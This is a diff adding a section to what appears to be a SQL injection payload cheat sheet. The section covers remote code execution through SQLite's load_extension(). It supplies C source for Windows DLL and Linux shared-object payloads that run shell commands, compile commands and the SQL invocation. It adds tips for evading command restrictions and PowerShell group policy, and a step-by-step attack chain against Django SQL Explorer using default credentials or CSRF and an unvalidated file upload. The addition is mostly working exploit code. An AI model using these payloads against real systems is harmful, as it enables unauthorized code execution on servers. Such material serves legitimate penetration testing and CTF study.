@@ -278,6 +278,54 @@ Single payloads that work across multiple database engines.
 ' UNION SELECT flag,NULL FROM secret--
 ```
 
+### SQLite load_extension() — RCE via DLL/SO Loading
+
+When `load_extension` is enabled (common in Django SQL Explorer, metabase-style admin-facing SQL tools, custom analytics backends), the attacker can load an arbitrary native library, which triggers a configurable entry point (`sqlite3_extension_init` or `<basename>_init`) — arbitrary code execution in the DB process.
+
+**Preconditions**:
+- SQL interface allows raw `SELECT load_extension(...)` (Django SQL Explorer, some BI tools).
+- A separate upload primitive (e.g. admin file upload with no MIME validation, static directory write) places the DLL/SO on disk with a known path.
+- `enable_load_extension(True)` has been called — often the default in analytics/reporting tools.
+
+**Windows DLL (cross-compile from Linux/macOS with MinGW)**:
+```c
+// payload.c
+#include <windows.h>
+#include <stdio.h>
+
+__declspec(dllexport) int sqlite3_extension_init(void *db, char **pzErrMsg, const void *pApi) {
+    WinExec("cmd.exe /c whoami > C:\\path\\writable\\out.txt", SW_HIDE);
+    Sleep(2000);
+    return 0;
+}
+BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) { return TRUE; }
+```
+Compile: `x86_64-w64-mingw32-gcc -shared -o payload.dll payload.c -Wl,--export-all-symbols`
+
+**Invocation (Note: pass path WITHOUT `.dll` extension; SQLite appends it)**:
+```sql
+SELECT load_extension('C:\\path\\to\\payload');
+```
+
+**Linux .so equivalent**:
+```c
+#include <stdlib.h>
+int sqlite3_extension_init(void *db, char **err, const void *api) {
+    system("id > /tmp/out");
+    return 0;
+}
+```
+Compile: `gcc -shared -fPIC -o payload.so payload.c`
+
+**Custom entry point**: SQLite tries `sqlite3_<basename>_init` if `sqlite3_extension_init` is absent. Name the DLL/SO to match (`sqlite3_mypayload_init` inside `mypayload.dll`).
+
+**Indirect execution**: If WinExec/`system()` is blocked or path-restricted, have the DLL launch an interpreter already on disk (`C:\Program Files\Python311\python.exe <script>`) pointing at an uploaded script — bypasses PowerShell group policy and gives full scripting.
+
+**Real-world chain (Django SQL Explorer)**:
+1. Auth as admin (e.g. via OAuth CSRF or default creds).
+2. Abuse Django admin model form that writes files without extension/content validation to upload `payload.dll` into a static directory.
+3. `POST /<sql-explorer>/play/` with `sql=SELECT load_extension('C:\\path\\to\\payload')` — DLL executes as the web service account.
+
 ### Blind Flag Extraction (character by character)
 ```python
 import requests
